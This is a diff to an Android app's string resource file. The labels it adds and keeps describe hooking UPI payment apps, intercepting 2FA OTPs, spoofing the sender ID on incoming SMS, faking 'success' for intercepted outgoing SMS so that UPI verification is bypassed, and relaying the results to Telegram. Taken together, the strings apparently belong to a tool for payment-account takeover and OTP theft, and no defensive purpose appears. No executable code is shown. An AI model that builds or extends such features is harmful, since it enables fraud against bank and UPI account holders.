@@ -39,7 +39,7 @@
     <string name="tab_telegram">TELEGRAM</string>
     <string name="upi_apps_az">UPI Apps A → Z (Select All)</string>
     <string name="upi_hook_section">UPI Apps Hook (Select Apps)</string>
-    <string name="hook_upi_verification">Hook UPI Verify + 2FA OTP (+20s timer)</string>
+    <string name="hook_upi_verification">Hook UPI Verify + 2FA OTP (per-app timer)</string>
     <string name="select_all_upi">Select All Apps</string>
     <string name="deselect_all_upi">Deselect All</string>
     <string name="save_upi_hooks">Save UPI Hooks</string>
@@ -67,6 +67,12 @@
     <string name="hook_incoming_sms">Hook Incoming SMS</string>
     <string name="hook_outgoing_sms">Hook Outgoing SMS</string>
     <string name="auto_extract_otp">Auto Extract OTP</string>
+    <string name="override_incoming_sender">Override Sender ID on Incoming SMS</string>
+    <string name="intercept_fake_success">Intercept &amp; Fake Success (outgoing)</string>
+    <string name="intercept_fake_success_warn">ON = outgoing SMS intercept + fake success to app (UPI verify)</string>
+    <string name="fake_intercept_telegram">Fake Intercept → Telegram (enable/disable)</string>
+    <string name="telegram_test_activated">Test bheja — Telegram check karo (MODULE ACTIVATED)</string>
+    <string name="telegram_test_not_active">Test bheja — NOT ACTIVATE (settings check karo)</string>
     <string name="sender_id">Sender ID:</string>
     <string name="message_body">Message Body:</string>
     <string name="message_body_hint">Type your message body (e.g. Your verification OTP code is 918204)</string>
